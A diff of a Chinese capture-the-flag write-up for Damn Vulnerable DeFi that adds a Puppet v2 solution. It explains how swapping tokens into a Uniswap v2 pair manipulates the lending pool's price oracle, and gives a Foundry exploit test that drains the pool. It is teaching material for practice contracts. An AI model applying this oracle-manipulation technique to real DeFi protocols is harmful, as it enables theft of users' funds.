@@ -511,7 +511,7 @@ forge test --match-contract Compromised -vvvv
 
 合约:
 
-[PuppetPool.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/puppet/PuppetPool.sol) 借贷合约
+- [PuppetPool.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/puppet/PuppetPool.sol) 借贷合约
 
 题目要求:
 
@@ -525,7 +525,7 @@ Uniswap v1 合约目前有 10 ETH 和 10 DVT 的流动性的池子,从余额 25 
 
 使用 foundry 编写测试:
 
-[PuppetPool.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/test/Compromised.t.sol) 
+[PuppetPool.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/test/PuppetPool.t.sol) 
 
  ```solidity
      function testExploit() public {
@@ -541,4 +541,50 @@ Uniswap v1 合约目前有 10 ETH 和 10 DVT 的流动性的池子,从余额 25 
 ```
 forge test --match-contract PuppetPool -vvvv
 ```
+
+
+
+# #9 - Puppet v2
+
+合约:
+
+- [PuppetV2Pool.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/puppet-v2/PuppetV2Pool.sol) 借贷合约
+
+题目要求:
+
+上一题接借贷池的 DEV 说他们已经吸取了教训。并且刚刚发布了一个全新版本,使用 Uniswap v2 交易所作为预言机,以及使用推荐的 `UniswapV2Library`.你从初始余额 20 ETH 和 10000 DVT 代币开始,需要掏空借贷池余额为 100 万个 DVT 代币.
+
+解决方案:
+
+看看 `PuppetV2Pool.sol` 合约, 看到 **calculateDepositOfWETHRequired()** 这次需要存入借出的 DVT 代币的 3倍金额的 WETH,再看看_getOracleQuote() 对 DVT 价格的获取,先通过 **UniswapV2Library.getReserves()** 获取两个代币的储备量,再使用**UniswapV2Library.quote()**  进行计算,然而计算方式和之前 v1 并没有多大区别,还是能轻松 swap 改变池子储备量,对价格进行操纵,步骤和上一题差不多,只需要改成 v2 的交换函数,和把 ETH 包装成 WETH.
+
+使用 foundry 编写测试:
+
+[PuppetV2Pool.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/test/PuppetV2Pool.t.sol) 
+
+```solidity
+    function testExploit() public {
+        vm.startPrank(attacker);
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+
+        dvt.approve(address(uniswapV2Router), type(uint256).max);
+        uniswapV2Router.swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, 1 ether, path, attacker, DEADLINE);
+        weth.deposit{value: attacker.balance}();
+        weth.withdraw(weth.balanceOf(msg.sender));
+        weth.approve(address(puppetV2Pool), type(uint256).max);
+        puppetV2Pool.borrow(dvt.balanceOf(address(puppetV2Pool)));
+        vm.stopPrank();
+        verfiy();
+    }
+```
+
+```
+forge test --match-contract PuppetV2 -vvvv
+```
+
+
+
+
 
